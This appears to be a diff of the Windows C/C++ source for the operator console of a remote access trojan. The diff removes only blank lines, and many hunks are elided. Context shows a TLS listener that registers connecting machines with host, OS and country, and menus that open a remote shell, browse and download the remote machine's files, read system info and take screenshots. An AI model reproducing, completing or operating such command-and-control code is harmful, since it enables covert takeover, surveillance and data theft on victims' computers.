@@ -4,7 +4,6 @@
 #include <commctrl.h>
 #include <windowsx.h>
 #include <stdio.h>
-
 enum ChildKind { K_SHELL, K_FILES, K_INFO, K_SHOT, K_COUNT };
 struct Client {
   TlsCtx tls;
@@ -13,7 +12,6 @@ struct Client {
   char shellPending[MAX_PATH];
   char* shotBmp; uint32_t shotBmpLen;
 };
-
 static HINSTANCE g_inst;
 static HWND g_main, g_list, g_port, g_status;
 static Client* g_clients[256]; static int g_clientCount;
@@ -22,7 +20,6 @@ static volatile LONG g_listening;
 static SOCKET g_listenSock = INVALID_SOCKET;
 static PCCERT_CONTEXT g_cert;
 static HCERTSTORE g_store;
-
 static bool LoadPfx(const char* path) {
   HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
   if (f == INVALID_HANDLE_VALUE) return false;
@@ -36,7 +33,6 @@ static bool LoadPfx(const char* path) {
   g_cert = CertFindCertificateInStore(g_store, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_ANY, NULL, NULL);
   return g_cert != NULL;
 }
-
 static void AppendEdit(HWND ed, const char* s, size_t len) {
   if (!ed || !s || !len) return;
   int n = GetWindowTextLengthA(ed);
@@ -46,18 +42,15 @@ static void AppendEdit(HWND ed, const char* s, size_t len) {
   SendMessageA(ed, EM_REPLACESEL, FALSE, (LPARAM)tmp);
   free(tmp);
 }
-
 static int FindClientIndex(Client* c) {
   for (int i = 0; i < g_clientCount; i++) if (g_clients[i] == c) return i;
   return -1;
 }
-
 static Client* ClientAt(int idx) {
   if (idx < 0) return NULL;
   LVITEMA it = {0}; it.mask = LVIF_PARAM; it.iItem = idx;
   return ListView_GetItem(g_list, &it) ? (Client*)it.lParam : NULL;
 }
-
 static void RefreshRow(Client* c) {
   int i = FindClientIndex(c); if (i < 0) return;
   ListView_SetItemText(g_list, i, 0, c->host);
@@ -65,7 +58,6 @@ static void RefreshRow(Client* c) {
   ListView_SetItemText(g_list, i, 2, c->os);
   ListView_SetItemText(g_list, i, 3, c->country);
 }
-
 static void DropClient(Client* c) {
   EnterCriticalSection(&g_cs);
   if (c->tls.sock != INVALID_SOCKET) closesocket(c->tls.sock);
@@ -76,7 +68,6 @@ static void DropClient(Client* c) {
   if (c->shotBmp) free(c->shotBmp);
   FreeTlsCtx(&c->tls); free(c);
 }
-
 static void Hello(Client* c, char* pl) {
   char* a = strchr(pl, '|'); if (a) { *a = 0; strncpy(c->host, pl, 255); }
   char* b = a ? strchr(a + 1, '|') : NULL;
@@ -89,7 +80,6 @@ static void Hello(Client* c, char* pl) {
   it.lParam = (LPARAM)c; it.pszText = c->host; ListView_InsertItem(g_list, &it);
   RefreshRow(c);
 }
-
 static void FillFiles(Client* c, char* pl, uint32_t plLen) {
   HWND lv = GetDlgItem(c->wnd[K_FILES], 1);
   if (!lv) return;
@@ -112,7 +102,6 @@ static void FillFiles(Client* c, char* pl, uint32_t plLen) {
     line = nl + 1;
   }
 }
-
 static void SaveFile(Client* c, const char* pl, uint32_t plLen) {
   if (!c->wnd[K_FILES] || !plLen) return;
   CreateDirectoryA("downloads", NULL);
@@ -124,7 +113,6 @@ static void SaveFile(Client* c, const char* pl, uint32_t plLen) {
   WriteFileAll(outPath, pl, plLen);
   MessageBoxA(c->wnd[K_FILES], outPath, "Saved", MB_ICONINFORMATION);
 }
-
 static DWORD WINAPI ClientThread(LPVOID p) {
   Client* c = (Client*)p;
   uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
@@ -155,7 +143,6 @@ static DWORD WINAPI ClientThread(LPVOID p) {
 out:
   DropClient(c); return 0;
 }
-
 static DWORD WINAPI AcceptThread(LPVOID) {
   for (;;) {
     SOCKET s = accept(g_listenSock, NULL, NULL);
@@ -171,7 +158,6 @@ static DWORD WINAPI AcceptThread(LPVOID) {
   }
   return 0;
 }
-
 #define IDC_SHELLIN 201
 #define IDC_SHELLSEND 202
 #define IDC_FPATH 301
@@ -185,27 +171,22 @@ static DWORD WINAPI AcceptThread(LPVOID) {
 #define IDM_INFO 202
 #define IDM_SHOT 203
 #define IDM_DROP 204
-
 static const struct { int id; const char* text; } kMenu[] = {
   {IDM_SHELL, "Remote shell"}, {IDM_FILES, "File manager"}, {IDM_INFO, "System info"},
   {IDM_SHOT, "Screenshot"}, {0, NULL}, {IDM_DROP, "Disconnect client"},
 };
-
 static HWND FocusChild(Client* c, int kind) {
   if (!c->wnd[kind]) return NULL;
   SetForegroundWindow(c->wnd[kind]); return c->wnd[kind];
 }
-
 static int KindOf(Client* c, HWND h) {
   for (int k = 0; c && k < K_COUNT; k++) if (c->wnd[k] == h) return k;
   return -1;
 }
-
 static void Fit(HWND h) {
   RECT rc; GetClientRect(h, &rc);
   SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
 }
-
 static void ChildLayout(HWND h, int kind, int w, int ht) {
   if (kind == K_SHELL) {
     MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht - 34, TRUE);
@@ -218,7 +199,6 @@ static void ChildLayout(HWND h, int kind, int w, int ht) {
     MoveWindow(GetDlgItem(h, 1), 0, 32, w, ht - 66, TRUE);
   } else if (kind == K_INFO) MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht, TRUE);
 }
-
 static void ChildCommand(Client* c, int kind, HWND h, int id) {
   if (!c) return;
   if (kind == K_SHELL && id == IDC_SHELLSEND) {
@@ -238,7 +218,6 @@ static void ChildCommand(Client* c, int kind, HWND h, int id) {
     TlsSendMsg(&c->tls, C_FS_GET, full, strlen(full));
   }
 }
-
 static void ChildPaint(Client* c, HWND h) {
   PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
   if (c && c->shotBmp && c->shotBmpLen > sizeof(BITMAPFILEHEADER)) {
@@ -251,7 +230,6 @@ static void ChildPaint(Client* c, HWND h) {
   } else TextOutA(dc, 10, 10, "no screenshot yet", 17);
   EndPaint(h, &ps);
 }
-
 static LRESULT CALLBACK ChildProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
   Client* c = (Client*)GetWindowLongPtrA(h, GWLP_USERDATA);
   const int kind = KindOf(c, h);
@@ -265,7 +243,6 @@ static LRESULT CALLBACK ChildProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
   }
   return DefWindowProcA(h, m, wp, lp);
 }
-
 static HWND MakeChild(const char* cls, const char* title, int kind, Client* c, int w, int h) {
   WNDCLASSA wc = {0}; wc.lpfnWndProc = ChildProc; wc.hInstance = g_inst;
   wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
@@ -274,7 +251,6 @@ static HWND MakeChild(const char* cls, const char* title, int kind, Client* c, i
   SetWindowLongPtrA(wnd, GWLP_USERDATA, (LONG_PTR)c);
   return wnd;
 }
-
 static void OpenShell(Client* c) {
   if (FocusChild(c, K_SHELL)) return;
   char title[512]; sprintf(title, "Shell - %s", c->host);
@@ -284,7 +260,6 @@ static void OpenShell(Client* c) {
   CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
   Fit(h); TlsSendMsg(&c->tls, C_SHELL_START, NULL, 0);
 }
-
 static void OpenFiles(Client* c) {
   if (FocusChild(c, K_FILES)) {
     SendMessage(GetDlgItem(c->wnd[K_FILES], IDC_FREFRESH), BM_CLICK, 0, 0); return;
@@ -301,7 +276,6 @@ static void OpenFiles(Client* c) {
   CreateWindowExA(0, "BUTTON", "Download", WS_CHILD | WS_VISIBLE, 0, 0, 90, 24, h, (HMENU)IDC_FGET, g_inst, NULL);
   Fit(h); SendMessage(GetDlgItem(h, IDC_FREFRESH), BM_CLICK, 0, 0);
 }
-
 static void OpenInfo(Client* c) {
   if (!FocusChild(c, K_INFO)) {
     char title[512]; sprintf(title, "SysInfo - %s", c->host);
@@ -311,7 +285,6 @@ static void OpenInfo(Client* c) {
   }
   TlsSendMsg(&c->tls, C_SYSINFO, NULL, 0);
 }
-
 static void OpenShot(Client* c) {
   if (!FocusChild(c, K_SHOT)) {
     char title[512]; sprintf(title, "Screen - %s", c->host);
@@ -319,7 +292,6 @@ static void OpenShot(Client* c) {
   }
   TlsSendMsg(&c->tls, C_SCREEN, NULL, 0);
 }
-
 static LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
   switch (m) {
     case WM_SIZE: {
@@ -375,7 +347,6 @@ static LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
   }
   return DefWindowProcA(h, m, wp, lp);
 }
-
 int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
   g_inst = inst; InitializeCriticalSection(&g_cs);
   WSADATA w; WSAStartup(MAKEWORD(2, 2), &w); InitCommonControls();
